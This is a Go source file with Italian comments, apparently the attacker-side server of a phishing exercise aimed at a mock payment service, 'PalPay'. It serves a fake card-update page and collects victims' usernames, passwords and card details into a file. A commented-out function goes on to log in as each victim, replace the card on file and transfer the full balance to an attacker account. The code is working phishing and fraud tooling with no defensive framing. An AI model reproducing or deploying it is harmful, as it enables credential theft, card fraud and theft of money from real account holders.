package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
)

// Variabile username
var username string

// Variabile password
var password string

func main() {
	http.HandleFunc("/steal", stealHandler)
	http.HandleFunc("/fakelogin", fakeloginHandler)
	http.HandleFunc("/fake-update-card.html", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "fake-update-card.html")
	})
	fmt.Println("Attacker server in ascolto su http://localhost:8090")
	http.ListenAndServe(":8090", nil)

}

func stealHandler(w http.ResponseWriter, r *http.Request) {
	log.Println("Richiesta di furto ricevuta")
	var data map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	// Insert username and password into data map
	data["username"] = username
	data["password"] = password

	log.Println("Dati ricevuti:", data)
	// Print received datas in log, on eby one
	for key, value := range data {
		log.Printf("%s: %v\n", key, value)
	}

	f, err := os.OpenFile("stolen.txt", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		log.Println("Errore apertura file:", err)
		http.Error(w, "Server error", http.StatusInternalServerError)
		return
	}
	defer f.Close()
	enc := json.NewEncoder(f)
	enc.SetEscapeHTML(false)
	if err := enc.Encode(data); err != nil {
		log.Println("Errore scrittura file:", err)
		http.Error(w, "Write error", http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusOK)
	// Chiama la funzione StealAndSend() se necessario
	log.Println("Dati rubati e salvati con successo")
	fmt.Fprintln(w, "Dati rubati e salvati con successo")
	//StealAndSend()
}

func fakeloginHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusOK)
		return
	}
	log.Println("Richiesta di login finto ricevuta")
	// Salvo il body in due variabili, username e password nel backend
	var data map[string]string
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	// Controllo che username e password siano presenti
	if data["username"] == "" || data["password"] == "" {
		log.Println("Username o password mancanti")
		http.Error(w, "Username or password missing", http.StatusBadRequest)
		return
	}
	log.Println("Dati di login ricevuti:", data)
	username = data["username"]
	password = data["password"]

	// Ritorno ok
	w.WriteHeader(http.StatusOK)
}

/*
func StealAndSend() {
	// Leggi i dati della carta dal file
	file, err := os.Open("stolen.txt")
	if err != nil {
		fmt.Println("Errore apertura file:", err)
		return
	}
	defer file.Close()

	var cardData map[string]interface{}
	dec := json.NewDecoder(file)
	if err := dec.Decode(&cardData); err != nil {
		fmt.Println("Errore parsing:", err)
		return
	}

	log.Println("Dati della carta ciucciati:", cardData)
	// Per ogni dato della carta, stampa il tipo e il valore
	for key, value := range cardData {
		log.Printf("%s: %v (%T)\n", key, value, value)
	}

	// Usa le variabili globali per login
	if username == "" || password == "" {
		fmt.Println("Credenziali mancanti")
		return
	}
	log.Println("Username:", username, "Password:", password)

	// Login su PalPay
	loginBody, _ := json.Marshal(map[string]string{
		"username": username,
		"password": password,
	})
	// Mostra come è visualizzato il body di login
	log.Println("Body di login:", string(loginBody))

	req, _ := http.NewRequest("PUT", "http://palpay:8080/login", bytes.NewBuffer(loginBody))
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Errore login:", err)
		fmt.Println("Login fallito per", username)
		return
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	log.Printf("Status login: %d, Body: %s\n", resp.StatusCode, string(bodyBytes))

	if err != nil || resp.StatusCode != 200 {
		fmt.Println("Login fallito per", username)
		return
	}
	var loginData map[string]interface{}
	json.Unmarshal(bodyBytes, &loginData)

	// Recupera i dati della carta dal file
	cardNumber, _ := cardData["card_number"].(string)
	cvv, _ := cardData["cvv"].(string)
	expiry, _ := cardData["expiry"].(string)
	holderName, _ := cardData["holder_name"].(string)

	// Invia la carta al backend PalPay
	cardBody, _ := json.Marshal(map[string]string{
		"username":    username,
		"card_number": cardNumber,
		"cvv":         cvv,
		"expiry":      expiry,
		"holder_name": holderName,
	})
	// Mostra come è visualizzato il body della carta
	log.Println("Body della carta:", string(cardBody))

	cardReq, _ := http.NewRequest("POST", "http://palpay:8080/set-card", bytes.NewBuffer(cardBody))
	cardReq.Header.Set("Content-Type", "application/json")
	cardResp, err := client.Do(cardReq)
	if err != nil || cardResp.StatusCode != 200 {
		fmt.Println("Errore invio carta:", err)
		return
	}
	cardResp.Body.Close()
	fmt.Println("Carta aggiornata per", username)

	// (Opzionale) Invia tutti i soldi all'attaccante come prima
	balance, ok := loginData["balance"].(float64)
	// Mostra il saldo dell'utente
	log.Println("Saldo dell'utente:", balance)

	if !ok || balance <= 0 {
		fmt.Println("Nessun saldo per", username)
		return
	}
	sendBody, _ := json.Marshal(map[string]interface{}{
		"sender":   username,
		"receiver": "attaccante", // Cambia con il vero username dell'attaccante
		"amount":   balance,
	})
	sendReq, _ := http.NewRequest("POST", "http://palpay:8080/send-money", bytes.NewBuffer(sendBody))
	sendReq.Header.Set("Content-Type", "application/json")
	sendResp, err := client.Do(sendReq)
	if err != nil {
		fmt.Println("Errore invio soldi:", err)
		return
	}
	sendResp.Body.Close()
	fmt.Println("Soldi trasferiti da", username)
}*/
